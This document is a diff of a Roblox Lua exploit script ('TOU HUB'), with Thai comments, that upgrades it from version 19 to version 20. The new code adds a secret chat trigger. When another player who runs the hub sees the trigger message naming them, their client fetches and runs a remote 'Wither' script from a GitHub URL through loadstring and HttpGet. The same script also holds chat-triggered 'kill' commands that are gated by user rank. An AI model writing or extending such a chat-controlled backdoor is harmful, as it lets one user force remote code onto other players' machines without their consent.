@@ -1,4 +1,4 @@
---// TOU HUB V19 - FULL SCRIPT: HORIZONTAL GUI + CLEAR !WITHER BUTTON 🕵️‍♂️👑
+--// TOU HUB V20 - FULL SCRIPT: !WITHER RUN ON TARGET (NOT SELF!) 🕵️‍♂️👑
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 local player = Players.LocalPlayer
@@ -76,7 +76,7 @@ ToggleShadow.Parent = ToggleBtn
 
 --// GUI หลัก (เริ่มซ่อน)
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 800, 0, 400)  -- ขยายกว้างเพื่อปุ่มแนวนอน
+MainFrame.Size = UDim2.new(0, 800, 0, 400)
 MainFrame.Position = UDim2.new(0.5, -400, 0.5, -200)
 MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
 MainFrame.BorderSizePixel = 0
@@ -102,7 +102,7 @@ Shadow.Parent = MainFrame
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0, 50)
 Title.BackgroundTransparency = 1
-Title.Text = "ยศ: " .. myRank .. " 🔥 TOU HUB V19"
+Title.Text = "ยศ: " .. myRank .. " 🔥 TOU HUB V20"
 Title.TextColor3 = myRank == "DEX" and Color3.fromRGB(255, 215, 0) or
                  myRank == "Premium" and Color3.fromRGB(0, 255, 255) or
                  Color3.fromRGB(100, 255, 100)
@@ -120,7 +120,7 @@ ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
 ScrollFrame.Parent = MainFrame
 
 local UIGridLayout = Instance.new("UIGridLayout")
-UIGridLayout.CellSize = UDim2.new(0, 780, 0, 80)  -- แนวนอน, กว้างพอ
+UIGridLayout.CellSize = UDim2.new(0, 780, 0, 80)
 UIGridLayout.CellPadding = UDim2.new(0, 10, 0, 10)
 UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
 UIGridLayout.Parent = ScrollFrame
@@ -168,9 +168,16 @@ local function killPlayer(targetName)
     end
 end
 
---// ฟังก์ชัน Wither (บังคับรัน Wither Script)
-local function witherPlayer(targetName)
-    sendChat("☠️ **WITHER ACTIVATED:** " .. targetName .. " ถูกกลืนกิน!")
+--// === ระบบ !Wither: ส่งคำสั่งให้เป้าหมายรันเอง (ถ้าเป้าหมายรัน TOU HUB) ===
+local WITHER_TRIGGER = "!!RUN_WITHER_NOW!!"  -- คำสั่งลับในแชท
+
+-- ฟังก์ชันบังคับรัน Wither ในฝั่งเป้าหมาย
+local function triggerWitherOnTarget(targetName)
+    sendChat(WITHER_TRIGGER .. " " .. targetName)
+end
+
+-- ฟังก์ชันรัน Wither จริง (เรียกจากแชทลับ)
+local function runWither()
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Wither"))()
     end)
@@ -294,7 +301,7 @@ local function addToGUI(realName, displayName, thumb, triggerType)
     if myRank == "DEX" then
         addCmdBtn("WITHER", Color3.fromRGB(100, 0, 100), function()
             sendChat("!Wither " .. realName)
-            witherPlayer(realName)
+            triggerWitherOnTarget(realName)
         end)
     end
 
@@ -303,7 +310,6 @@ local function addToGUI(realName, displayName, thumb, triggerType)
         Entry:Destroy()
     end)
 
-    -- อัปเดต Canvas
     ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIGridLayout.AbsoluteContentSize.Y + 20)
 end
 
@@ -320,6 +326,7 @@ TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(msgData
     local displayName = p.DisplayName
     local thumb = Players:GetUserThumbnailAsync(sender.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
 
+    -- !เช็ค
     if lower == "!เช็ค" then
         if sender.UserId ~= player.UserId then
             addToGUI(realName, displayName, thumb, "check")
@@ -329,11 +336,13 @@ TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(msgData
         end
     end
 
+    -- SCRIPT Trigger
     if text:upper() == "SCRIPT CITY THAILAND 2 BY:TOUX1" then
         sendChat("🔥 **TRIGGER DETECTED** | " .. realName .. " 🕵️‍♂️")
         addToGUI(realName, displayName, thumb, "script")
     end
 
+    -- Trap !ฆ่า
     if getRank(player.Name) ~= "DEX" and lower:find("!ฆ่า") and lower:find(player.Name:lower()) then
         sendChat("💀 **โดนคำสั่งฆ่า!** " .. player.Name .. " ตาย!")
         task.wait(0.1)
@@ -342,16 +351,25 @@ TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(msgData
         end
     end
 
+    -- ตรวจจับคำสั่งลับ !Wither จาก DEX
     if myRank == "DEX" and lower:find("!wither") then
         local target = lower:match("!wither%s+(%w+)")
         if target and Players:FindFirstChild(target) then
             sendChat("☠️ **DEX ACTIVATED WITHER:** " .. target .. " ถูกกลืนกิน!")
-            witherPlayer(target)
+            triggerWitherOnTarget(target)
+        end
+    end
+
+    -- ตรวจจับคำสั่งลับจากแชท (ถ้าเป็นเป้าหมาย)
+    if text:find(WITHER_TRIGGER) then
+        local target = text:match(WITHER_TRIGGER .. "%s+(%w+)")
+        if target and target:lower() == player.Name:lower() then
+            runWither()  -- รัน Wither ในฝั่งเป้าหมาย
         end
     end
 end)
 
---// อัปเดต Canvas เมื่อเพิ่ม Entry
+--// อัปเดต Canvas
 UIGridLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIGridLayout.AbsoluteContentSize.Y + 20)
 end)
